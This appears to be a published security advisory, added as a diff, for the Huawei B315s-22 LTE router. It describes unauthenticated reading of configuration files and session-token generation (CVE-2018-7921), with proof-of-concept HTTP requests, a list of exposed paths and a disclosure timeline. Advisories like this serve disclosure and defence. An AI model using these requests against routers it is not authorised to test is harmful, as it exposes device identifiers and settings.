@@ -1,0 +1,124 @@
+#Product Family: LTE
+#Model B315s – 22
+#Firmware version: 21.318.01.00.26
+#Author: Usman Saeed (usman [at] xc0re.net)
+
+1. Unauthenticated access to sensitive files:
+
+It was observed that the web application running on the router, allows unauthenticated access to sensitive files on the web server.
+
+POC:
+
+By sending a simple GET request without authentication cookie one can get see valid responses:
+
+Request:
+GET /config/deviceinformation/config.xml HTTP/1.1
+Host: <omitted>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+
+Response:
+
+HTTP/1.1 200 OK
+…
+
+<?xml version=”1.0″ encoding=”UTF-8″?>
+<config>
+<devicename>1</devicename>
+<serialnumber>0</serialnumber>
+<imei>1</imei>
+<imsi>1</imsi>
+<iccid>0</iccid>
+<msisdn>1</msisdn>
+<hardwareversion>1</hardwareversion>
+<softwareversion>1</softwareversion>
+…
+
+Other resources accessible are:
+
+/config/dialup/config.xml
+/config/global/config.xml
+/config/global/net-type.xml
+/config/lan/config.xml
+/config/pcassistant/config.xml
+/config/voice/config.xml
+/config/wifi/configure.xml
+## After discussion with Huawei, according to them as the consequence of this vulnerability is quite low thus they marked it as a non-vulnerability.
+2. Unauthenticated valid token generation [CVE-2018-7921]
+
+It was observed that an unauthenticated user can generate “SessionID” and “__RequestVerificationToken” by simply sending an HTTP GET request to “/api/webserver/SesTokInfo”.
+
+These tokens, although might not give the user full access to the router but using these, one can access to several restricted resources on the router.
+
+POC:
+
+First, we send a GET request, as mentioned above.
+
+Request:
+GET /api/webserver/SesTokInfo HTTP/1.1
+Host: <omitted>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Content-Length: 0
+
+Response:
+HTTP/1.1 200 OK
+…
+
+<?xml version=”1.0″ encoding=”UTF-8″?>
+<response>
+<SesInfo>SessionID=<omitted></SesInfo>
+<TokInfo><omitted></TokInfo>
+</response>
+
+Now we use these tokens in one of our request where authentication is required:
+
+Request:
+GET /api/cradle/status-info HTTP/1.1
+Host: <omitted>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+__RequestVerificationToken: <omitted>
+X-Requested-With: XMLHttpRequest
+Cookie: SessionID=<omitted>
+DNT: 1
+Connection: close
+
+Response:
+
+HTTP/1.1 200 OK
+…
+
+<?xml version=”1.0″ encoding=”UTF-8″?>
+…
+
+It is to note with an invalid, expired authentication session, the response is:
+
+Response:
+HTTP/1.1 200 OK
+…
+
+<?xml version=”1.0″ encoding=”UTF-8″?>
+<error>
+<code>125002</code>
+<message></message>
+</error>
+
+[+] Responsible Disclosure:
+
+Vulnerabilities identified – 31/07/2018
+Reported to Huawei – 31/07/2018
+Huwaei patched the vulnerability and issued a CVE – 31/08/2018
+Public disclosure – 01/09/2018
